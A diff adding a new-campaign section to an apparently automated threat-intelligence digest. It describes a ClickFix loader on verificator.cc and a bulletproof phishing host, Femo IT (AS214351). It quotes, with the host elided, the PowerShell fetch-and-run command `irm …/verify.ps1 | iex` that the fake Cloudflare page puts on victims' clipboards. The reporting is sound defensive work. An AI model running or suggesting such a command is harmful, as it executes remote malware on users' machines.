@@ -4,6 +4,14 @@
 
 Automated campaign intelligence from Webamon. Here's what our sensors saw across tracked phishing and malware-delivery estates in the last 24 hours.
 
+## ⭐ New campaign spotlight — verificator.cc ClickFix → Femo IT bulletproof estate
+
+We've added a new tracked campaign this window: **[Femo IT (AS214351) Bulletproof Phishing Estate + verificator.cc ClickFix](https://intel.webamon.com/campaigns/da5add1b8957951473127d5061d2eed4e89f68bd)** — **624 domains, 62% still online (386), first seen 3 January 2026, active today.**
+
+It started from a single `Win + R` screenshot search that surfaced a fake-Cloudflare **ClickFix** loader on `verificator.cc` — a cloned "Just a moment…" gate that poisons the clipboard with a fileless `irm …/verify.ps1 | iex` PowerShell command. Pivoting the loader's **cert-SAN fingerprint** onto its **ASN fingerprint** exposed the host beneath: **Femo IT Solutions Limited, AS214351 (Germany)** — a single bulletproof network where every tracked domain contacts only this ASN. It runs at least six parallel operations at once: hotel/PMS credential phishing (Rezlynx, Newbook, D-EDGE, DIRS21, Guestline), banking (SoFi, Navy Federal, E*TRADE), crypto-exchange spoofs (ChangeNOW, ff-exchange), gaming skin scams, fake-YouTube copyright lures, and the ClickFix info-stealer delivery itself.
+
+OSINT associates AS214351 with the **defhost** brand (`defhost.co`) and a broad malicious-tooling set (Lumma, StealC, Rhadamanthys, RedLine, Evilginx/EvilGoPhish, Meduza and more) — consistent with a bulletproof host renting to many actors. New-domain volume is **surging in August** (16–22/day). The estate is now re-checked every 4 hours as a single tracked record.
+
 ## 📊 By the numbers (last 24h)
 
 - **49** campaigns with activity
